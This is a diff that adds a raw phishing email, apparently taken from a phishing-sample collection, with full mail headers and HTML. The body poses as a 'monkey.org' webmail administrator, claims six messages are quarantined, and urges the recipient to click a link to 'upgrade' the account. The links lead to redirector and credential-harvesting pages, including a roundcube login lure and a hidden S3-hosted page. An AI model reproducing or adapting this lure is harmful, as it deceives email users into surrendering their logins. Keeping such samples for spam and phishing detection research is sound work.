@@ -1,0 +1,116 @@
+Return-Path: admin@mail.luxelane.ink
+Delivered-To: jose@monkey.org
+X-FDA: 83239507848.25.3885C90
+Received: from mail.luxelane.ink (mail.luxelane.ink [193.169.228.40])
+	by imf24.b.hostedemail.com (Postfix) with ESMTP id B658E80003
+	for <jose@monkey.org>; Wed, 19 Mar 2025 20:56:02 +0000 (UTC)
+Authentication-Results: imf24.b.hostedemail.com;
+	dkim=pass header.d=luxelane.ink header.s=dkim header.b=LmbuIRpi;
+	spf=none (imf24.b.hostedemail.com: domain of admin@mail.luxelane.ink has no
+ SPF policy when checking 193.169.228.40)
+ smtp.mailfrom=admin@mail.luxelane.ink;
+	dmarc=pass (policy=quarantine) header.from=luxelane.ink
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1742417763;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Pz/u3BIUfo7Vdk6s8uoPK05UJCjafjtLubzg/n/O+04=;
+	b=ckfBgOOFUqlc9m/9O2pqnScSbTuiAbclmmNuDqws+atRzPNUJpniOHaVOuKhzYDdDS3DHM
+	+f4QaNjjPEd6xOhXxIxzqZb8vrN2Nt6AE1JrLhXibC6g7YbYuoa13+kpWAV/spKyOY1sGp
+	jlrVKPfzhNf7qZNO8MljZDyQeF3gSZE=
+ARC-Authentication-Results: i=1;
+	imf24.b.hostedemail.com;
+	dkim=pass header.d=luxelane.ink header.s=dkim header.b=LmbuIRpi;
+	spf=none (imf24.b.hostedemail.com: domain of admin@mail.luxelane.ink has no
+ SPF policy when checking 193.169.228.40)
+ smtp.mailfrom=admin@mail.luxelane.ink;
+	dmarc=pass (policy=quarantine) header.from=luxelane.ink
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1742417763; a=rsa-sha256;
+	cv=none;
+	b=TBTkiWHMBOrGRp9sBEcK2lws+mhCz6zgZSkIPq8Zj8wZQMEaoCafNdt/e3xyMCzc4Nsx7Z
+	qdECTlDaMbjNQUkL3i75OOFOjZ1gd5WNU0On81mcRcbHbZ/HDEl8hjkMCuq83I35gSZEj1
+	2mlOio8+qF82ZHa718grXdzpDU5jidU=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim; d=luxelane.ink;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=admin@luxelane.ink;
+ bh=Pz/u3BIUfo7Vdk6s8uoPK05UJCjafjtLubzg/n/O+04=;
+ b=LmbuIRpi4cHpEk5/+uOv21mzsJhsYQY4lsycwMPVe0FexeNd+2+vEQ4RgPuHeF4fnuvRpVRk94fa
+   NvfJfR6FDPa/dGPaWL0gFT8QAwj3r2lmG9qNh3KK+l80u77EKVBI3pGjXkc9HkxmxloU7VNjGy5D
+   LhnEWEnvCINtFPg/UKY+urbmeiKtV1eNwvwJ+MzQixf5nZ1KRvlT3DSsg8yx7pyGKJTC40LtM1am
+   VSebrtfKdwkSYZDDKm/cw6GNQ39kQVzdMhU6IPkWRJ1TD/ZerbQ90ww2WwKRQUHHWL0FaB8mfD9a
+   rnTbguJnX7qqyODweigUR1Ins7ed7MpRHStDOg==
+From: "Monkey Service Provider"<admin@luxelane.ink>
+To: jose@monkey.org
+Subject: [ Jose@monkey.org ]:  Automated Request [ 3/20/2025 1:55:59 p.m. ]  
+Date: 19 Mar 2025 13:55:59 -0700
+Message-ID: <20250319135559.5C01257262D75632@luxelane.ink>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam05
+X-Rspamd-Queue-Id: B658E80003
+X-Stat-Signature: a8bsz9ohbp65h36fgmimiawbbmk9sopk
+X-Spam-Status: No, score=5.50
+X-Rspam-User: 
+X-HE-Tag: 1742417762-173016
+X-HE-Meta: 
+ U2FsdGVkX1+HSDRpax0xODGeRFxxRmOscZDugkXt0+voG0WtTNb+jnu4u6YNhoKoR3/6zst66627CDLWm+EbVBrXK9UXdolFi/wFfiL3LiJdEskhtSYHdZWyXgvcYv1Ca2tnXMDG4JbbU48tEivg5ydHc3H3W9uWMhykPZaCP8DNWH/wgI72v5OgTyenBs85ZuBFNr5BmJ2HQ6AF9R9OTQpLVlK/N27xkb9Ki0vHd6uGM/OYsBwh7xLtZkwwH0P2dN6MFmoLVYhuhYAhpxwhqvu518acSUs1QV26zEQQ5AQg0Q3xj7Z5WlhN50FsEFrrYRu2j55zlfj8kPSBd+ueX743Azig3dU7pSUt0a0HgXo1wBfAWg7Xqgh+sCeEBpOEgsYUxiqG/XsIJqxbShCCGSiPngg+GMlgDB+lvu9FuQskY0KvbjYn0f7WxNSJt1k/xztcqj0maog9Uen/NWndD0c/n6jGM2xeaY/FkQKMh52domeXWPiiwZTS+JYxjXSWxhsrKW7Aiw6sjF3J2KjyLAPNTcl9yBrZHhvLwp39aoU20LX0mHeZG0uHsyayDWeMoh1m8+VajhcSTi2rC2etFuG5v7qCwcycPIDsjWRp60pTeSuXb9SNM8thuGMXXYnAnuRzq3NwENE/CHjG1znI/6akS3sGLDrO1LX3N6kRABQ+t/jMIxCyOf6/PhL6xKbmg8wc6iHjk/Lz6SgzwYVb6yi0FPLRZP7tC3Tw1zEYFV8f7COo3DeAWseqML4iKZPOJLRTtVpMFhkZg/wTke1fIU4QSKKs09Ung4JWl2lhZreclXEvGNL7s4Al7yHsDw3jAO4nZ61qZJ8ur7GYo8rOFkfP+SGoxZA6UK/g7u3v1N41KwciSdkfpQRFsk6HN7gtfQOE/xLnQv6ckG3os53JAncn1ssqZ1sAEt3MuZW0rSnE0PoPJZzrVlSGK1wNuoBR4YTxMt9NqPW+dqEyCcTeT6z4Ghj
+ QrJllLnEqUGbpYP3MNIj6p+Sp+ThT+J0dwcqM/kCvVBBEdG8ZLbl5kbVmjqF8THl9YaRl+0Doy1dWQaeaUeWKwR0QXpbgXBzfqq86jw5ZiRK9lKFE8th4ssdAcLvdAdzhuneQTMONWUTdKnwkrlxHqxTiPpqLfUlSTTqMxmqhaBMZWPxUUZOfdYFXgtGHwSm45lEnbwGz2yVPI1WR6tNpRCNSEdkYeo0+aZHey5oMhc0+U0+H7cb2SzoutnIk6573U5ROi34nQYNr+996+p7F1vzEJJbEyeoVx4W9LUHtUJypYTezue9A+OV7YKfu2ol67/4ycA4clYL4aGVYfB6ZAQYOFKInER5p7ej08wl3fwqAev95BHY7mYAVQnVBrTE6tmn8
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 96
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
+<body>
+<table style=3D'border-color: rgb(238, 238, 238); width: 1095px; height: 36=
+px; color: rgb(51, 51, 51); text-transform: none; line-height: 1.6em; lette=
+r-spacing: normal; font-family: "times new roman"; font-size: 11px; font-st=
+yle: normal; font-weight: 400; word-spacing: 0px; white-space: normal; bord=
+er-collapse: collapse; orphans: 2; widows: 2; background-color: rgb(238, 23=
+8, 238); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial;'>
+<tbody style=3D"border-color: rgb(238, 238, 238); box-sizing: border-box;">=
+
+<tr style=3D"border-color: rgb(238, 238, 238); box-sizing: border-box;">
+<td style=3D"margin: 0px; padding: 3px; border: 0px solid rgb(0, 0, 0); bor=
+der-image: none; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-s=
+erif; box-sizing: border-box; background-color: rgb(243, 255, 248);">
+<div style=3D"padding-top: 0px; border-top-color: currentColor; border-top-=
+width: 0px; border-top-style: none; box-sizing: border-box;">Message is fro=
+m monkey.org trusted source</div></td></tr></tbody></table>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l;">Dear User,<br>&nbsp;<br>
+We notice you are still using our old version of&nbsp;&nbsp;monkey.org webm=
+ail server, 6 New email has been recently added to your mailbox quarantine =
+area. click<span>&nbsp;</span>
+ <a style=3D"color: rgb(17, 85, 204); text-decoration: underline;" href=3D"=
+https://redrectin.site/redial.html#jose@monkey.org" target=3D"_blank" data-=
+saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://energygraduate.co=
+m/success/roundcube/index.php?email%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmai=
+l&amp;ust=3D1629887395722000&amp;usg=3DAFQjCNHZ8wHreOeaL8PbWq4BgzX8e7JQIQ">=
+HERE</a><span>&nbsp;</span>to upgrade your account&nbsp;<font color=3D"#2c6=
+6d3"><u>jose@monkey.org</u></font><a href=3D"https://wsjrb.s3.amazonaws.com=
+/Email+alert.html">&nbsp;</a>
+ to our new centralized 6.8&nbsp;monkey.org Webmail version to avoid missin=
+g important mails.</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l;">Monkey&nbsp;admin </p></body></html>
+
